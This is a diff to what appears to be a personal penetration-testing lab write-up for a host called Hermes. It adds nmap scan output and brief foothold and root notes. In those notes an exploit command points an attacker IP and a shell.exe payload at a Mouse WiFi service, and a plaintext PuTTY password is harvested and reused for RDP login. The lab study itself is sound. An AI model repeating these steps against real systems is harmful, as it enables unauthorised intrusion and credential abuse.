@@ -102,10 +102,10 @@ Ee24zIK4cDhJHL4H
 ```
 PORT     STATE SERVICE       VERSION
 21/tcp   open  ftp           Microsoft ftpd
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|_Can't get directory listing: TIMEOUT
 | ftp-syst: 
 |_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
 80/tcp   open  http          Microsoft IIS httpd 10.0
 | http-methods: 
 |_  Potentially risky methods: TRACE
@@ -114,11 +114,12 @@ PORT     STATE SERVICE       VERSION
 135/tcp  open  msrpc         Microsoft Windows RPC
 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
 445/tcp  open  microsoft-ds?
+1978/tcp open  unisql?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
+|_    system windows 6.2
 3389/tcp open  ms-wbt-server Microsoft Terminal Services
-| ssl-cert: Subject: commonName=oscp
-| Not valid before: 2024-05-30T16:22:00
-|_Not valid after:  2024-11-29T16:22:00
-|_ssl-date: 2024-09-02T13:51:47+00:00; -4s from scanner time.
+|_ssl-date: 2024-09-07T10:40:55+00:00; -4s from scanner time.
 | rdp-ntlm-info: 
 |   Target_Name: OSCP
 |   NetBIOS_Domain_Name: OSCP
@@ -126,17 +127,56 @@ PORT     STATE SERVICE       VERSION
 |   DNS_Domain_Name: oscp
 |   DNS_Computer_Name: oscp
 |   Product_Version: 10.0.19041
-|_  System_Time: 2024-09-02T13:51:07+00:00
-7680/tcp open  tcpwrapped
+|_  System_Time: 2024-09-07T10:40:15+00:00
+| ssl-cert: Subject: commonName=oscp
+| Not valid before: 2024-05-30T16:22:00
+|_Not valid after:  2024-11-29T16:22:00
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port1978-TCP:V=7.94SVN%I=7%D=9/7%Time=66DC2CFA%P=x86_64-pc-linux-gnu%r(
+SF:NULL,14,"system\x20windows\x206\.2\n\n")%r(GenericLines,14,"system\x20w
+SF:indows\x206\.2\n\n")%r(GetRequest,14,"system\x20windows\x206\.2\n\n")%r
+SF:(HTTPOptions,14,"system\x20windows\x206\.2\n\n")%r(RTSPRequest,14,"syst
+SF:em\x20windows\x206\.2\n\n")%r(RPCCheck,14,"system\x20windows\x206\.2\n\
+SF:n")%r(DNSVersionBindReqTCP,14,"system\x20windows\x206\.2\n\n")%r(DNSSta
+SF:tusRequestTCP,14,"system\x20windows\x206\.2\n\n")%r(Help,14,"system\x20
+SF:windows\x206\.2\n\n")%r(SSLSessionReq,14,"system\x20windows\x206\.2\n\n
+SF:")%r(TerminalServerCookie,14,"system\x20windows\x206\.2\n\n")%r(TLSSess
+SF:ionReq,14,"system\x20windows\x206\.2\n\n")%r(Kerberos,14,"system\x20win
+SF:dows\x206\.2\n\n")%r(SMBProgNeg,14,"system\x20windows\x206\.2\n\n")%r(X
+SF:11Probe,14,"system\x20windows\x206\.2\n\n")%r(FourOhFourRequest,14,"sys
+SF:tem\x20windows\x206\.2\n\n")%r(LPDString,14,"system\x20windows\x206\.2\
+SF:n\n")%r(LDAPSearchReq,14,"system\x20windows\x206\.2\n\n")%r(LDAPBindReq
+SF:,14,"system\x20windows\x206\.2\n\n")%r(SIPOptions,14,"system\x20windows
+SF:\x206\.2\n\n")%r(LANDesk-RC,14,"system\x20windows\x206\.2\n\n")%r(Termi
+SF:nalServer,14,"system\x20windows\x206\.2\n\n")%r(NCP,14,"system\x20windo
+SF:ws\x206\.2\n\n")%r(NotesRPC,14,"system\x20windows\x206\.2\n\n")%r(JavaR
+SF:MI,14,"system\x20windows\x206\.2\n\n")%r(WMSRequest,14,"system\x20windo
+SF:ws\x206\.2\n\n")%r(oracle-tns,14,"system\x20windows\x206\.2\n\n")%r(ms-
+SF:sql-s,14,"system\x20windows\x206\.2\n\n")%r(afp,14,"system\x20windows\x
+SF:206\.2\n\n")%r(giop,14,"system\x20windows\x206\.2\n\n");
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-|_clock-skew: mean: -3s, deviation: 0s, median: -4s
+| smb2-time: 
+|   date: 2024-09-07T10:40:15
+|_  start_date: N/A
+|_clock-skew: mean: -4s, deviation: 0s, median: -4s
 | smb2-security-mode: 
 |   3:1:1: 
 |_    Message signing enabled but not required
-| smb2-time: 
-|   date: 2024-09-02T13:51:08
-|_  start_date: N/A
 
 ```
+
+## Foothold
+1. Found mouse wifi 1.7.8.5 is running from SNMP UDP scan
+2. run exploit ``` python3 50972.py Hermes 192.168.45.194 shell.exe  ```
+
+## Root
+1. found putty session ``` ����������͹ Putty Sessions
+    RegKey Name: zachary
+    RegKey Value: "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"
+ ```
+2. try rdp / smb fuck w/ netexec success then 
+    ```
+     xfreerdp /v:hermes /u:zachary /p:"Th3R@tC@tch3r" /cert-ignore
+    ```
